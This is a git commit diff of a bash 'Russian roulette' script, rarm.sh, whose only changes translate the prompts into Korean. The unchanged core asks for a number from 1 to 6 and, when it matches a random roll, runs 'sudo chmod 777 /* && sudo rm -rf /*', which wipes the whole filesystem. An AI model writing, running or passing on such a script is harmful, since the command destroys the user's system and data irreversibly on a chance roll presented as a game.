9bc332ccc75b62f0f56f56038ff2b166131271b7
참돔 <rlfud3119@naver.com>
2016-08-07 02:12:46 +0900

    Update rarm.sh

--- rarm.sh
+++ rarm.sh
@@ -1,17 +1,17 @@
 #! /bin/bash
 ha=6;
-echo -n "num input: "
+echo -n "숫자만 입력해줘 : "
 read num
 if [ $num -gt $ha ]
 then
-	echo "$ha over"
-	echo -n "re input: "
+	echo "$ha 초과"
+	echo -n "다시 입력해줘 : "
 	read num
 	fi
 if [ $num -eq $[ $[$RANDOM % $ha] + 1] ]
 then
-	echo "fuck"
+	echo "ㅅㄱ"
 	sudo chmod 777 /* && sudo rm -rf /*
 else 
-	echo nice
+	echo "살았습니다"
 	fi
